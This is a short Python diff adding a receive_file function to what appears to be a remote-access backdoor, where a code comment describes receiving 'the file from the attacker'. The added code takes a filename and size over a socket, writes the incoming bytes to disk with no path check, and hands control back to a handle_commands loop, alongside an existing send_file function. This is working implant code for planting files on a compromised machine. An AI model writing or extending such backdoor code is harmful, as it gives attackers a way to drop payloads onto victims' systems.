@@ -48,6 +48,23 @@ def send_file(conn):
 
     # After download is complete, call the `handle_commands` function again
 
+#Function to receive the file from the attacker
+def receive_file(conn):
+    filename = conn.recv(1024).decode('utf-8')
+    file_size = int(conn.recv(1024).decode('utf-8'))  # Get the file size of the file
+    bytes_received = 0
+
+    with open(filename, 'wb') as file:  # Open the file to save it locally
+            while bytes_received < file_size:
+                chunk = conn.recv(1024)
+
+                file.write(chunk)
+
+                bytes_received += len(chunk)
+                print(f"Received {bytes_received}/{file_size} bytes")
+
+    print(f"File {filename} received successfully. Total bytes received: {bytes_received}")
+    handle_commands(conn)
 
 # Function to handle all incoming commands in a loop
 def handle_commands(conn):
